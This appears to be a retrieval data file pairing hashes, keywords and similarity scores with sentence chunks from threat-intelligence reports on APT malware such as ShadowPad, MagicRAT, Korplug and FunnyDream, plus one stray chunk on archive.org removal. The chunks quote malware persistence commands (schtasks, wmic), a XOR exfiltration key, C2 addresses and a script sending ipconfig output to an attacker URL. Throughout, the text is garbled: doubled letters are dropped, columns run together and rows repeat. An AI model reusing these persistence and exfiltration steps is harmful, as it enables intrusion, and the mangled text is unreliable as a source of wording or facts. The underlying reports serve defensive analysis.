d191454ce52e10bc0e62b43cc0e8b3fc,"stealer,",0.7703280519540574,"[']org, and they have engaged in website defacements under the group name AjaxTM since 2010.', 'By 2014, the Ajax Security Team had transitioned from performing defacements (their last defacement was in December 2013) to malware-based espionage, using a methodology consistent with other advanced persistent threat actors in this region.', '(Crowdstrike) CrowdStrike Inteligence has also ben tracking and reporting internaly on this threat group since mid-January 2014 under the name FLYING KITEN, and since that time has sen targeting of multiple U.S.-based defense contractors as wel as political disidents.', 'Observed Sectors: Defense and disidents.', 'Countries: USA.', 'Tols used Stealer.', 'Operations 2013 Operation Safron Rose performed <htps:/w.fireye.com/content/dam/fireye-w/global/en/curent- threats/pdfs/rpt-operation-safron-rose.pdf> Information <htps:/w.crowdstrike.com/blog/cat-scratch-fever-crowdstrike-tracks-newly- reported-iranian-actor-flying-kiten/> 138 Threat Group Cards: A Threat Actor Encyclopedia FunyDream Names FunyDream (Kaspersky) Country China Motivation Information theft and espionage First sen 2018 Description In early 2020 Kaspersky published a report based on its investigation of an ongoing atack campaign caled FunyDream.', 'This Chinese-speaking actor has ben active for at least a few years and poseses diferent implants with various capabilities.', 'Since mid-2018, researchers at Kaspersky saw continuing high activity from this threat actor and among their targets were a number of high-level government organisations as wel as some political parties from various Asian countries including the Philipines, Thailand, Vietnam, and Malaysia.', 'The campaign comprises a number of cyber espionage tols with various capabilities.', ""As of the latest monitoring of the global cybersecurity company, FunyDream's espionage atacks are stil ongoing.""]"
75291a1b40c627ac33b55119a494eacd,"stealer,",0.8812993603014394,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
18fdef6f2cea9e0b1ab1a71f532e578a,"stealer,",0.8812993603014394,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
fec6cedb170308a7634a3d9f978a981b,"archive contains the files,",0.7525508956754587,"['If so, al files are also dumped.', 'The filter is C:\\ProgramData\\Phone>.|.', 'DATA comand We only identified a few DATA samples, and found these variants are of leser complexity than the CKU variant.', 'The data colection uses the same principle as for the CKU comand, with diferent filters.', 'The variants we found dont have the same behaviour, for instance here are two filters found in diferent data variants: From comon directory (CSIDL_MYDOCUMENTS, CSIDL_MYMUSIC, CSIDL_MYVIDEO, FOLDERID_DOWNLOADS), the comand gather files with the folowing extensions: |jpeg|png|gif|bmp|hwp|hwpx|doc|docx|xls|xlsx|xlsm|pt|ptx|pdf|txt|mp3|amr|m4a|og|ac|wav|wma|3gp|eml|lnk|zip|rar|eg|alz The comand gather files from D:\\ and E:\\ with the folowing extensions: jpg|jpeg|png|gif|bmp|hwp|hwpx|doc|docx|xls|xlsx|xlsm|pt|ptx|pdf|txt|mp3|amr|m4a|og|ac|wav|wma|3gp|eml|lnk|zip|rar|eg| Data extraction Data extraction (for CKU and DATA comands) consists in creating a ZIP archive of files with the folowing name format e_[ckupd]-[a-zA-Z0-9]{8}.zip.', 'The ckupd part indicates the type of data contained in the archive: d: documents colected by the data DL c: the archive contains screnshots k: the archive contains .ini files u: the archive contains files from removable disks p: the archive contains data from C:\\ProgramData\\Phone 6/15 Here is an example of the function which generates archive names.', 'A file named zdirpath.txt is aded to the archive.', 'This file contains two fields: the dst field: this is the path of the archive on the infected host the src field: this field contains the filter coresponding to the curent extracted items.', 'For instance, the e_k archives could contains the folowing zdirpath.txt: dst:C:\\Users\\TVM\\ApData\\Roaming\\o27PUrAt1mUZxl5X\\e_k-2S8ngaA5 src:C:\\Users\\Public\\ ini| Archives are encrypted and sent to the C2 with a simple XOR.', 'Al DLs we found use the key: PEXdRUSBACX3DAD.', 'Note: Although we didnt analyze this, the name of some samples (notably data.dl and data-withoutzip.dl) sugests that the format of the extraction might difer.']"
583b051f7d0af3a232690a3ab12163b5,download,0.7841188173904248,"['For any inquiries about this service, visit the ESET Threat Inteligence page.', 'IoCs SHA-1 Filename ESET detection name D 69AB6B906F8DCE03B43BEB7A07189A69DC507B coreclr.dl Win32/Agent.ADMW Korp Dec 10AE4784D0FBC9CD5FD85B150830AEA34A1DEN/A Win32/Korplug.TC (dum mem 69AB6B906F8DCE03B43BEB7A07189A69DC507B coreclr.dl Win32/Agent.ADMW Korp 4EBFC035179CD72D323F0AB357537C094A276E6D PowerDVD18.exe Win32/Delf.UTN Korp Dec FDB16B8BA724659BAB5B2E1385CFD476F10607 N/A Win32/Korplug.TB (dum mem Dec 7E059258CF963B95BDE479D1C374A4C30624986 N/A Win32/Korplug.TC (dum mem 792729769760ECAB37F2A32DE4E61E7828547 SHELSEL.ocx Win32/Agent.ADMW Korp F05E89D031D0515978A79D81685B62AF4E3F9 SymHp.exe Win32/Delf.UTN Korp AB01E09872A094DC79890171A1764DE8B4360 BomerangLib.dl Win32/Korplug.TH Korp CDB15B1ED97985D94F83AF0548390E02A49F7 PotPlayer.dl Win32/Agent.ADYO Korp 908F5D21C2E14D4F65A7A38E26593A0D9A70 SmadHok32.dl Win32/Agent.ADMW Korp 47A1CE31353E8C26A8F4E02C1D378295B302C9E N/A Win32/Agent.ADMW Korp 528C2CDB5926EC970B216943C9D453F5E92 SmadHok32c.dl Win32/Agent.ADMW Korp CBD875E456C84F9E87EC392750D69A75FB6B23A SHELSEL.ocx Win32/Agent.ADMW Korp 2CF4BAFE062D38FAF472A7D1067B8039C2CE82 Adobe_Caps.dl Win32/Agent.ADMW Korp 97C92AD7145CF9386ABD527A8BCD6FABF9A148DocConvDl.dl Win32/Agent.ADYO Korp Dec 39863CECA1B0F54F5C063B3015B76CDB05971F3 N/A Win32/Korplug.TD (dum mem Vuln legit 0D5348B5C9A6C743615E819AEF152FB5B0DAB97 FontEDL.exe clean File exec Vuln legit Micr C8F582549315EAF4B5046F79AC953E71AD1C0 Silverlight.Configuration.execlean Silve Con Utilit Vuln legit D4FE4A4F2BD2C19F2613980C1839087E39CD PowerDVDLP.exe clean Pow exec Vuln legit 65898ACA030DCEFDA7C970D3A31E8EA7FC84ASymantec.exe clean Sym AntiV exec Vuln Adobe Stock Photos legit 7DB61872830F4A0E6BF96FAF6537D01F164FC clean CS3.exe Stoc exec 10/13 SHA-1 Filename ESET detection name D COVID-19 travel restrictions C13D0D69365DFAF9C472E615A61E058EBF596 EU reviews list of third Win32/Agent_AGen.NJ Dow countries.exe REGULATION OF THE EUROPEAN PARLIAMENT 062473912692F7A3FAB8485101D4FCF6D704ED23 Win32/TrojanDownloader.Agent.GDLDow AND OF THE COUNCIL.exe 2B5D6B51895DA4928D310C7C897F51A050 log.dl Win32/Agent.ACYW Korp 51DA645A7282FB84F18C398E67D761FD63 2.exe Win32/Agent.ADPL Korp 5902E1A58065D7248CD9D7D62C3F865813E6 log.dl Win32/Agent.ADXE Korp F67C53678B7857D1BC48040EA90E6C52946B3 KINGSTON.exe Win32/Agent.ADXZ Korp Vuln 58B6B5FD3F2BFD18262F547A932A4AFDF4E76 PotPlayer.exe clean legit exec Network Domain IP First sen Notes 103.56.53[.', ']120 20210615Korplug C&C 154.204.27[.', ']181 2020105Korplug C&C.', '43.254.218[.', ']42 20210209Download server.', '45.131.179[.', ']179 2020105Korplug C&C.', '176.13.69[.', ']91 2021-04-19Korplug C&C.', 'upespr[.']"
920bbf3f4cf30cf9c556531074485448,download,0.8178555471319602,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
da720a0b860cc8b213511d0e3c6beb1b,download,0.777563052410962,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
da720a0b860cc8b213511d0e3c6beb1b,download,0.777563052410962,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
5d9861a26c9cd5bdcb58921a7b6843d1,download,1.0,"['The RAT can not only aces and query Before atempting comunications to the databases but can also enumerate the networks to comand and control server, the malware checks which the infected computer is conected, set up for network conectivity.', ""It does this by using the network conections, modify the registry, lock the workstation'scren,controlprocesesandservices 34Polymorphicprograms canbemodified (ormodifythemselves) tohaveadiferentfilehash and/orsizewhileretainingthesame 3SQLinstructions areused toquerycertaintypesofdatabases functionality."", 'This facilitates code reuse by making signature and obtaininformationfromthem.', 'based detectionmoredificult.', 'PAGE6OF 24 COPYRIGHT COMANDFIVEPTY LTD.ALRIGHTSRESERVED.', 'legitimate Microsoft Windows domain by theatackersto disguisethem asbeingasociated download.windowsupdate.com.', 'This legitimate with NateOn an Instant Mesaging Service owned domain is hardcoded into the malware but may be by SK Comunications.', 'Legitimate files developed overiden by modifying the malwares by SK Comunicationsarealso knownby thename configuration.', ""nateon.exe'37."", 'Having determined there is network THEMALICIOUSINFRASTRUCTURE conectivity, the malware establishes Calback domains are translated to IP adreses comunications with the calback domain using the Domain Name System (DNS)38protocol.', ""nateon.duamlive.com'35on TCP port 80 (configured This translatesthedomaininto auniqueadreson as noted previously).""]"
5d9861a26c9cd5bdcb58921a7b6843d1,download,1.0,"['The RAT can not only aces and query Before atempting comunications to the databases but can also enumerate the networks to comand and control server, the malware checks which the infected computer is conected, set up for network conectivity.', ""It does this by using the network conections, modify the registry, lock the workstation'scren,controlprocesesandservices 34Polymorphicprograms canbemodified (ormodifythemselves) tohaveadiferentfilehash and/orsizewhileretainingthesame 3SQLinstructions areused toquerycertaintypesofdatabases functionality."", 'This facilitates code reuse by making signature and obtaininformationfromthem.', 'based detectionmoredificult.', 'PAGE6OF 24 COPYRIGHT COMANDFIVEPTY LTD.ALRIGHTSRESERVED.', 'legitimate Microsoft Windows domain by theatackersto disguisethem asbeingasociated download.windowsupdate.com.', 'This legitimate with NateOn an Instant Mesaging Service owned domain is hardcoded into the malware but may be by SK Comunications.', 'Legitimate files developed overiden by modifying the malwares by SK Comunicationsarealso knownby thename configuration.', ""nateon.exe'37."", 'Having determined there is network THEMALICIOUSINFRASTRUCTURE conectivity, the malware establishes Calback domains are translated to IP adreses comunications with the calback domain using the Domain Name System (DNS)38protocol.', ""nateon.duamlive.com'35on TCP port 80 (configured This translatesthedomaininto auniqueadreson as noted previously).""]"
c6e9167aeba80052f8215a05761dfcd8,download,0.8392022780406604,"['nifty-login .', 'com domain .', 'nifty-user .', 'com server .', 'universityexp .', 'com download .', 'yourturbe .', 'org services .', 'gogle-config .', 'com dunya .', '80 .']"
8b4f9d650778f96f05ba79da56898432,download,0.8526682551749308,"[']240.86.20:5651 Hosts: Mikael LC (administrator@mikael-company[.', ']ru) George Alan Developments Incorporated C:\\windows\\system32\\wbem\\wmic.exe proces where ExecutablePath=\'C:\\ProgramData\\lsas.exe\' delete C:\\windows\\system32\\wbem\\wmic.exe proces where ExecutablePath=\'C:\\ProgramData\\svchost.exe\' delete C:\\windows\\system32\\schtasks.exe /delete /tn ""Network Security Update"" /f C:\\windows\\system32\\schtasks.exe /create /sc onstart /tn ""Network Security Update"" /tr ""C:\\ProgramData\\lsas.exe"" /en SYSTEM %PROGRAMDATA%\\lsas.exe %PROGRAMDATA%\\svchost.exe %PROGRAMDATA%\\config.xml %PUBLIC%\\output.exe %APDATA%\\dnsoption.exe %APDATA%\\Microsoft\\Windows\\CDSyncReporting.exe Aditional information 3/4 It is recomended to change the so-caled atack surface (atack surface), including for filtering mesh ports for external information flows.', 'With the method of revealing the facts of tuneling information flows behind the aditional DNS protocol, perform rechecking and further monitoring of the log files for the presence of anomalous DNS backlogs.', 'Implement the posibility of centralized management of anti-virus protection on al non-powered computers; transfer the ability to live on computers (launching Yara-rules, acesing shkdlvh files, searching for indicators then), in the first line, in remote aces mode.', 'Graphic images Rice.', '1 Download fre download 4/4']"
6c9da1182b14cab92b846b684d492547,download,0.78638726452815,"['Fortunately, there are numerous companies that actively scan the uploaded libraries to identify posible malware.', 'When malicious packages are found, they often consist of information stealers (shocker).', 'Figure 45.', 'Malicious npm packages by Social Enginering technique 78 If these creds were doughnuts, the hot and fresh sign would stil be on.', '79 Bet you cant gues what coding environments the DBIR team uses :p 80 Same as this report: If you got this PDF or printed isue from a friend, please go to verizon.com/ dbir and download a copy for yourself.', 'Download early, download often!', '81 htps:/w.npmjs.com/about 82 Were afraid there are no cheat codes to get money.', 'Microtransactions for live-service games function the other way around.', '2024 DBIR Incident Clasification Paterns 45 Lastly, there were also packages that CIS targeted what we (and a few people smarter than we are) believe are Controls for dependency confusion atacks.', 'In these types of atacks, the atackers take consideration advantage of how some toling checks for packages on public repositories before it checks for private ones.', 'If the Mitigating against stolen atackers know that organizations are using the library super-col-internal- credentials library, which is stored in their internal repository, the atackers can create Acount Management [5] a library on a public repository caled Establish and Maintain an super-col-internal-library and the Inventory of Acounts [5.1] toling may check the public repo Disable Dormant Acounts [5.3] first before loking at the internal ones.']"
5f53a3a1339c0af277c7641aa04535e1,API hashing,0.8164911763814514,"['T105 Proces Injection ShadowPad is injected into a wmplayer.exe proces.', 'T140 Deobfuscate/Decode ShadowPad launcher uses XOR to decrypt Files or Information the payload.', 'ShadowPad uses a custom algorithm to decrypt strings and configuration.', 'T1027 Obfuscated Files or ShadowPad shelcode is XOR-encoded Information and uses fake conditional jumps to hinder disasembly.', 'ShadowPads strings and configuration are encrypted.', 'It also uses API hashing.', 'T143 Hiden Window ShadowPad is injected into a wmplayer.exe proces started in a hiden window.', 'Discovery T1010 Aplication Window ShadowPads keyloging module lists Discovery aplication windows.', 'T1083 File and Directory ShadowPads RecentFiles module lists Discovery files recently acesed.', '10/1 Tactic ID Name Description Comand T1071 Standard Aplication ShadowPad can use HTP and HTPS for and Layer Protocol C&C comunications.', 'Control T1043 Comonly Used ShadowPad uses TCP:43 and UDP:43.']"
0873b5a6a965dc8aefec6755d8537a99,retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key,0.7618253508146869,"['In fact, al comunication betwen the Trojan and C2 could be viewed using an ordinary trafic snifer.', 'Group-IB experts retrieved several JS comands that were executed on the infected device.', 'They were al designed to obtain information about an infected device.', 'They even included CMD comands (as described in the coresponding section).', ""Tols TinyFluf 6/17 As mentioned above, Group-IB experts detected two versions of TinyFluf: Campaign date SHA1 202-03-25 c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03-2 bd0a6a3628f268a37ac9d708d03f57fef5ed5e Campaign date;SHA1 202-03-25;c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03- 2;bd0a6a3628f268a37ac9d708d03f57fef5ed5e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8d6703b5df7373b457abc) as the tol is much simpler than its predecesor."", 'Once launched, the aplication creates the directory %APDATA%\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.', 'If the directory already exists, the aplication terminates itself.', 'The aplication copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no ned to waste time on de-obfuscation because the obfuscated layer restarts Node.js and pases a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module caled Threat Hunting Framework Polygon displays the atack As sen in the screnshot, the argument of the second node.exe proces is a script without obfuscation."", 'Its functionality is simple: it conects to the adres 46.101.13[.']"
0873b5a6a965dc8aefec6755d8537a99,"retrieves the MachineGuid of the infected system from the ""SOFTWARE\Microsoft\Cryptography\MachineGuid"" registry key.",0.7618253508146869,"['In fact, al comunication betwen the Trojan and C2 could be viewed using an ordinary trafic snifer.', 'Group-IB experts retrieved several JS comands that were executed on the infected device.', 'They were al designed to obtain information about an infected device.', 'They even included CMD comands (as described in the coresponding section).', ""Tols TinyFluf 6/17 As mentioned above, Group-IB experts detected two versions of TinyFluf: Campaign date SHA1 202-03-25 c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03-2 bd0a6a3628f268a37ac9d708d03f57fef5ed5e Campaign date;SHA1 202-03-25;c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03- 2;bd0a6a3628f268a37ac9d708d03f57fef5ed5e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8d6703b5df7373b457abc) as the tol is much simpler than its predecesor."", 'Once launched, the aplication creates the directory %APDATA%\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.', 'If the directory already exists, the aplication terminates itself.', 'The aplication copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no ned to waste time on de-obfuscation because the obfuscated layer restarts Node.js and pases a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module caled Threat Hunting Framework Polygon displays the atack As sen in the screnshot, the argument of the second node.exe proces is a script without obfuscation."", 'Its functionality is simple: it conects to the adres 46.101.13[.']"
0034c03613ff5a7deb6db5caced7e65f,and hostname,0.7571705928794396,"['The data within the POST stub is stream constructed in a bufer with a header at ofset 0 (\\ Pragma: no-cache x30\\x30) folowed by the remote sever, remote Cache-Control: max-age=25920 port, XOR encrypted data and function cal Conection: Close location.', 'The function cal location is represented Content-Length: 1594 by the textual values shown in the table below and User-Agent: Mozila/4.0 is selected using a switch case statement as shown (compatible; MSIE 6.0;Windows NT in Figure 12.', 'It is used by the atacker to track the 5.1) cal path that resulted in the network beacon.', 'The Host: htp.jpaols[.', ']com\\x0d\\x0a\\ XOR encrypted data contains the MAC Adres, x0d\\x0a\\xcf\\xcf.', 'hostname and campaign code.', 'Numeric Representation Textual Representation 0 index.asp 1 index.php 2 index.jsp 3 index.cs 4 home.asp Figure 12: Cal path determined and embeded in network beacon 12 w.fireye.com FireEye: Operation Quantum Entanglement To elucidate the encryption scheme, let us go over a sample decryption proces.', 'The Figures 13 and 14 below shows data before and after a bitwise NOT operation.', 'Figure 13: Encrypted POST stub Figure 14: POST stub after bitwise NOT operation In the resulting data after NOT operation, the XOR key is \\x30\\x30\\x34\\x31.', 'When aplied to the hex data folowing it, we get the decrypted data below, which contains the MAC Adres, hostname, and campaign code.', 'The Python routine to perform this decryption is included in Apendix A Figure 15: Embeded XOR encrypted data in POST stub We observed plugin functionality in the implant.']"
c6e9167aeba80052f8215a05761dfcd8,the encrypted config.,0.7726071993536989,"['yaho-user .', 'com cmart .', 'iownyour .', 'org pofuyer .', '4pu .', 'com config .', 'microupdata .', 'com poly .', 'jwt .', 'ourhoby .', 'com copyright .']"
564c219dc0a2c3edd2eed08025387d9d,Enumerate files on desktop,0.7788114452623733,"['Nodachi: A previously unknown set of plugins uti- lized by SideCopy were caling Nodachi.', 'These Golang-based plugins have reconaisance and file-stealing abilities targeting an Indian multi-factor authentication ap known as Kavach.', 'RAT ANALYSIS CETARAT CetaRAT is a C#-based RAT family first sen in the wild since 2019.', 'Its malicious capabilities (Figure 8) include: Execution: Download and run arbitrary executables and comands.', 'Figure 8: CetaRAT comand codes.', 'File management: Upload, download, delete, rename and enumerate files.', 'Capture: Take screnshots and monitor clipboard data.', 'Proceses: List or kil proceses on the endpoint.', '2021 Cisco.', 'Al rights reserved.', 'talos-external@cisco.com | talosinteligence.com page 9 of 23 InSideCopy: How this APT continues to evolve its arsenal DETARAT DetaRAT is a previously unknown C#-based implant used by SideCopy.']"
08a0ccc49008dbbf532b22d39ac2b886,delete key files,0.8542855495673394,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
8b1ec3103590201632c0768238d50bea,the opening of a URL file extracted from the archive.,0.7605688236956025,"['Comparing comand lines in the covid-19 and Zeplin shortcuts The mechanism for initial infection is fundamentaly the same: trying to open either of the shortcuts leads to runing a comand that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.', 'Further actions are performed with the help of an extracted JS script.', 'Figure 2.', 'Contents of script 34fDFkfSD32.js But here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\\Users\\Public\\Downloads, achieves persistence by ading itself to the startup folder and ading a scheduler task, and runs the payload.', 'The script also sends the output of ipconfig in a POST request to htp:/zeplin.atwebpages[.]com/inter.php.', 'The comand run by the shortcut also contains the opening of a URL file extracted from the archive.', 'The name of the URL file and the target adres depend on which shortcut is opened: 1/41 Conversations - iOS - Swipe Icons - Zeplin.url goes to: htps:/ap.zeplin.io/project/5b5741802f3131c3a63057a4/scren/5b589f697e4ce37e0e61df Tokbox icon - Ods and Ends - iOS - Zeplin.url goes to: htps:/ap.zeplin.io/project/5c161c03fde4d50a251e20a/scren/5cef98986801a41be3512b.', 'This is the only diference betwen the two LNK files.', 'In both cases, the target page is hosted on Zeplin, a legitimate service for colaboration betwen designers and developers, and requires loging in to view.', 'The payload consists of two files: svchast.exe It functions as a simple local shelcode loader.', 'The shelcode read from a fixed path.']"
8b1ec3103590201632c0768238d50bea,a GET request is sent to the C2 server.,0.8062952916547591,"['Four protocols are suported: 1.', 'Standard TCP conection Aplication-level mesages are sent unchanged as TCP segments.', '6/41 2.', 'Equivalent to HTP Long Poling The client creates two TCP conections.', 'The first wil be used to get packets from the server, and the second to send them.', 'During the first conection, a GET request is sent to the C2 server.', 'The server replies with headers with code 20 and Content- Length: 524280.', 'The subsequent stream of aplication-level mesages from the server to the client is sent as the body of an HTP response.', 'Figure 10.', 'First HTP conection with C2 After the corect response headers are received, the malware establishes a second conection to the same port, where a POST request is made.', 'The header dCy is generated by the client based on the UID and, it would sem, serves as the sesion ID that links the two conections.']"
cf257e6c27074e5b0154ddaa7a016f66,a GET request is sent to the C2 server.,0.7790628974339082,"['C2 comunication For C2 comunication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxZ"" and the Windows version puled from the registry.', 'The server responds back with data in the format <id><user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable efectively matching the patern:<zero or more bytes>ZxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPDATA%\\Debug\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is sucesful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download sucesful"" and RN_E stands for run eror.', 'If failed, the malware atempts to download the program data 25 times, and after that, it wil launch itself and exit.', 'Conclusion htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 16/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted atacks in their region.', 'Threat actors usualy emerge with smart techniques to acomplish their adversarial objectives and we have sen such an atempt in this campaign with the adition of a new variant to their arsenal.']"
fcef139433bae54ea996aa09f7e1fcf4,a GET request is sent to the C2 server.,0.7790628974339082,"['C2 comunication For C2 comunication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxZ"" and the Windows version puled from the registry.', 'The server responds back with data in the format <id> <user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable efectively matching the patern:<zero or more bytes>ZxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPDATA%\\Debug\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is sucesful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download sucesful"" and RN_E stands for run eror.', 'If failed, the malware atempts to download the program data 25 times, and after that, it wil launch itself and exit.', 'Conclusion Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted atacks in their region.', 'Threat actors usualy emerge with smart techniques to acomplish their 15/19 adversarial objectives and we have sen such an atempt in this campaign with the adition of a new variant to their arsenal.']"
475cc557a403e5a686bf4e9a5b16e3d2,archive,1.0,"['Services display sensitive content.', 'for your neds.', 'such as Archive.org and Archive.Today aim to preserve al websites, which can Ad the folowing to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im oficialy requesting the imediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from al archive.org products.', 'stil have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disalow: / code present content asociated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be sen Disalow: / at: Archive.org Removal Create a file caled verify.txt at the htps:/DOMAIN/robots.txt If your website(s) apear on Archive.', 'rot of your site.']"
475cc557a403e5a686bf4e9a5b16e3d2,archive,0.7882656392379622,"['DMCA Notice: with the folowing.', 'DMCA Notice: I am the site owner and sole User-agent: archive.org_bot copyright holder for each of I am the site owner and sole Disalow: / the domains cited above.', 'This copyright holder for each of leter is oficial notifica- the domains cited above.', 'This Modify your .htaces file to include tion under Section 512(c) of leter is oficial notifica- the Digital Milenium Copy- the folowing.', 'tion under Section 512(c) of right Act (DMCA), and I sek the Digital Milenium Copy- RewriteEngine On the removal of the aforemen- right Act (DMCA), and I sek tioned infringing material the removal of the aforemen- RewriteCond %{HTP_USER_AGENT} from your servers.', 'Archive.', 'tioned infringing material (archive.org_bot) [NC] org does not have any right from your servers.', 'Archive.', 'or permision to reproduce, RewriteRule .', '* - [R=403,L] Today does not have any right sel or display my websites in or permision to reproduce, any way, shape or form.', 'I am If using Cloudflare, ad the sel or display my websites in providing this notice in god folowing to a WAF rule.']"
6676698d65e372feb79c0159d9d2b11e,AES-128-CBC for encryption.,0.8346233093013999,[]
8b1ec3103590201632c0768238d50bea,use AES-128 in CFB mode as the encryption algorithm,0.9757967645429402,"['Figure 17.', 'Handling of PL shelcode in the loader body (ChaCha20) The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.', 'We can also find key information here in the structure of the PL shelcode: at ofset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.', '9/41 Figure 18.', 'Handling of PL shelcode in the loader body (AES-128) Older loader versions use Cryptography API: Next Generation (BCrypt* functions) in an equivalent way.', 'They use AES-128 in CFB mode as the encryption algorithm.', 'The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC.', 'The file should contain PL shelcode of the same format as in the self-contained loader.', 'The name depends on the specific sample and is encrypted with the algorithm used in it.', 'It can contain a ful file path (although we did not detect any such samples) or a relative path.', 'Figure 19.']"
